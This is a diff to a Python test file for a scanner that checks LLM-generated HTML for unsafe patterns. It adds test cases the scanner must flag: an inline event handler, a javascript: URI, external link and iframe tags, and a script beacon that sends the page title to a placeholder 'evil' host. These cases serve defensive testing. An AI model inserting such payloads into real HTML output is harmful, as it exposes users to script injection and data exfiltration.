@@ -1,5 +1,7 @@
 """Tests for LLM-output HTML safety scanning (AISEC-248 PR1)."""
 
+import pytest
+
 from src.utils.html_safety import scan_html_for_unsafe_patterns
 
 
@@ -88,3 +90,22 @@ def test_clean_deck_with_chart_navigation_words_in_text_not_flagged():
         '<p>Open the report to navigate the data.</p></div>'
     )
     assert scan_html_for_unsafe_patterns(html) == []
+
+
+@pytest.mark.parametrize("html", [
+    '<button onclick="alert(1)">x</button>',          # inline event handler (live Probe C)
+    '<a href="javascript:fetch(0)">x</a>',             # javascript: URI
+    '<link rel="stylesheet" href="https://evil/x.css">',  # external link
+    '<iframe src="https://evil/x"></iframe>',          # external iframe
+    '<script>new Image().src="https://evil/?d="+document.title</script>',  # image beacon
+])
+def test_flags_new_unsafe_vectors(html):
+    assert scan_html_for_unsafe_patterns(html), f"should flag: {html}"
+
+
+def test_clean_chartjs_still_passes():
+    clean = (
+        '<div class="slide"><canvas id="c"></canvas></div>'
+        '<script>const ctx=document.getElementById("c");new Chart(ctx,{});</script>'
+    )
+    assert scan_html_for_unsafe_patterns(clean) == []
